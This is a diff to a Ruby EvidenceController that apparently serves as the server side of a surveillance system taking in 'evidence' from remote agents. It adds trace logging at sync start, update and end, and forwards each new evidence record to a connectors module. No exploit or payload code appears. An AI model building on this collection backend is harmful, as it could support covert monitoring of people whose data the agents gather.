@@ -6,6 +6,7 @@ require_relative '../db_layer'
 require_relative '../evidence_manager'
 require_relative '../evidence_dispatcher'
 require_relative '../position_resolver'
+require_relative '../connectors'
 
 # rcs-common
 require 'rcs-common/symbolize'
@@ -154,6 +155,8 @@ class EvidenceController < RESTController
     # convert the string time to a time object to be passed to 'sync_start'
     time = Time.at(@params['sync_time']).getutc
 
+    trace :info, "#{agent[:name]} sync started [#{agent[:ident]}:#{agent[:instance]}]"
+
     # update the agent version
     agent.version = @params['version']
 
@@ -204,6 +207,8 @@ class EvidenceController < RESTController
     ev[:data] = {content: address}
     ev[:data] = ev[:data].merge(position)
     ev.save
+
+    Connectors.new_evidence(ev)
   end
 
   # used by the collector to update the synctime during evidence transfer
@@ -216,6 +221,8 @@ class EvidenceController < RESTController
     # retrieve the agent from the db
     agent = Item.where({_id: session[:bid]}).first
     return not_found("Agent not found: #{session[:bid]}") if agent.nil?
+
+    trace :info, "#{agent[:name]} sync update [#{agent[:ident]}:#{agent[:instance]}]"
 
     # convert the string time to a time object to be passed to 'sync_start'
     time = Time.at(@params['sync_time']).getutc
@@ -255,6 +262,8 @@ class EvidenceController < RESTController
     # retrieve the agent from the db
     agent = Item.where({_id: session[:bid]}).first
     return not_found("Agent not found: #{session[:bid]}") if agent.nil?
+
+    trace :info, "#{agent[:name]} sync end [#{agent[:ident]}:#{agent[:instance]}]"
 
     agent.stat[:last_sync] = Time.now.getutc.to_i
     agent.stat[:last_sync_status] = RCS::DB::EvidenceManager::SYNC_IDLE
